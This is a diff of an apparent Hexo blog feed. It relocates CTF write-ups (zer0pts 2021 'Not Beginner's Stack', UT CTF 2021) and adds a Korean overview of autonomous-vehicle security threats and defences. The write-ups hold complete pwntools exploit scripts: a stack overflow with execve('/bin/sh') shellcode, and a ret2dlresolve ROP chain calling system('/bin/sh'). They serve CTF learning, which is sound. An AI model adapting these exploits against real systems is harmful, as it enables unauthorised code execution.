@@ -164,27 +164,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2021 zer0pts CTF</title>
-    <url>/2021/03/06/2021-03-07-zer0pts_CTF_2021/</url>
-    <content><![CDATA[<center>2021 zer0pts CTF Write-up </center>
-
-
-<h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
-<p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Write-up</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwnable</tag>
-        <tag>write-up</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2021 UT CTF</title>
     <url>/2021/03/12/2021-03-13-UT_CTF_2021/</url>
     <content><![CDATA[<center>2021 UT CTF Write-up </center>
@@ -223,6 +202,27 @@
 <p>Finally, I can call <code>system(/bin/sh/)</code> </p>
 <h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>Write-up</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwnable</tag>
+        <tag>write-up</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021 zer0pts CTF</title>
+    <url>/2021/03/06/2021-03-07-zer0pts_CTF_2021/</url>
+    <content><![CDATA[<center>2021 zer0pts CTF Write-up </center>
+
+
+<h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
+<p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Write-up</category>
@@ -632,6 +632,92 @@
         <tag>CVE</tag>
         <tag>VM Escape</tag>
         <tag>VirtualBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Automotive Security Model</title>
+    <url>/2021/11/01/2021-11-02-Automotive_service/</url>
+    <content><![CDATA[<h2 id="자율주행차-서비스"><a href="#자율주행차-서비스" class="headerlink" title="자율주행차 서비스"></a>자율주행차 서비스</h2><p><img src="https://user-images.githubusercontent.com/49066484/139845220-3a0c063c-590a-4d89-9e16-95e43bdf8a1c.png" alt="1"></p>
+<ul>
+<li>자율주행차 서비스로는 셔틀 및 온-디멘드, 카쉐어링, 주차, 배송, 군집 주행, 어시스턴트, C-ITS 등이 있다.</li>
+<li>차량은 V2X 통신을 위하여 셀룰러 통신, WAVE통신 등을 한다.</li>
+<li>셔틀 및 온-디멘스, 배송 서비스 등은 차량의 각종 정보를 백엔드 인프라로 전송한다.</li>
+<li>군집 주행 및 어시스턴트 서비스는 차량 간 정보를 공유하며 원격 제어 등 편의 기능을 제공한다.</li>
+<li>C-ITS 서비스는 주행 중에 필요한 교통 상황과 도로정보를 실시간으로 제공한다.</li>
+<li>자율주행차 서비스 보안 부분으로는 차량 보안, 백엔드 인프라 보안, 통신 채널 보안 등이 있다.</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="자율주행차-서비스-보안-위협"><a href="#자율주행차-서비스-보안-위협" class="headerlink" title="자율주행차 서비스 보안 위협"></a>자율주행차 서비스 보안 위협</h2><p><img src="https://user-images.githubusercontent.com/49066484/139849656-b515d48d-ede2-48ae-b5ab-653bbb622850.png" alt="2"></p>
+<ul>
+<li><p>차량과 벡엔드 인프라가 통신할 때 공격자는 도청 및 데이터 변조를 수행할 수 있고, 백엔드 인프라에 대하여 DoS와 같은 직접적인 공격을 수행할 수 있다.</p>
+</li>
+<li><p>차량에 대해서는 차량 제어기의 인터페이스를 통하여 송수신되는 데이터 또는 저장된 데이터를 도청, 변조하거나 업데이트 패키지를 위변조하여 공격을 수행할 수 있다.</p>
+</li>
+<li><p>차량에 대한 공격</p>
+<ul>
+<li>펌웨어 변조</li>
+<li>차량 원격제어 해킹</li>
+<li>CAN 위변조</li>
+<li>차량 불법 조작</li>
+<li>DoS</li>
+</ul>
+</li>
+<li><p>통신채널에 대한 공격</p>
+<ul>
+<li>통신 도청</li>
+<li>통신 메시지 위변조</li>
+<li>정보 무단 획득</li>
+<li>거짓 정보 제공</li>
+<li>부인</li>
+</ul>
+</li>
+<li><p>백엔드 인프라에 대한 공격</p>
+<ul>
+<li>정보 유출</li>
+<li>권한 상승</li>
+<li>DoS</li>
+</ul>
+</li>
+<li><p>위를 포함한 다양한 어택 벡터가 존재한다.</p>
+</li>
+</ul>
+<h2 id="자율주행차-서비스-보안기술-및-솔루션"><a href="#자율주행차-서비스-보안기술-및-솔루션" class="headerlink" title="자율주행차 서비스 보안기술 및 솔루션"></a>자율주행차 서비스 보안기술 및 솔루션</h2><p><img src="https://user-images.githubusercontent.com/49066484/139851217-951e2cb6-7cb4-49f7-adde-bb94741552cc.png" alt="3"></p>
+<ul>
+<li>보안위협별 대응 보안기술은 아래와 같다.</li>
+<li>차량에 대한 공격 대응 기술<ul>
+<li>펌웨어 변조 : Hardware Security Model, Secure Boot, Secure Debug, Secure Diagnosis …</li>
+<li>차량 원격제어 해킹 : Secure Access, IDS, SecOS …</li>
+<li>CAN 위변조 : IDS, SecOS, Secure Software Update …</li>
+<li>차량 불법 조작 : Secure Access, Secure Diagnosis …</li>
+<li>DoS : IDS</li>
+</ul>
+</li>
+<li>통신채널에 대한 공격 대응 기술<ul>
+<li>통신 도청 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li>
+<li>통신 메시지 위변조 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li>
+<li>정보 무단 획득 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li>
+<li>거짓 정보 제공 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li>
+<li>부인 : IPSec, TLS/DTLS, WAVE 통신 보안 기술 …</li>
+</ul>
+</li>
+<li>백엔드 인프라에 대한 공격 대응 기술<ul>
+<li>정보 유출 : Firewall, DB Encryption, Access Control, Endpoint Detection &amp; Response …</li>
+<li>권한 상승 : Access Control …</li>
+<li>DoS : Firewall …</li>
+</ul>
+</li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li>https://한국인터넷진흥원.한국/jsp/common/downloadAction.jsp?bno=259&amp;dno=124&amp;fseq=1</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Automotive</category>
+      </categories>
+      <tags>
+        <tag>Automotive</tag>
+        <tag>Car</tag>
       </tags>
   </entry>
   <entry>
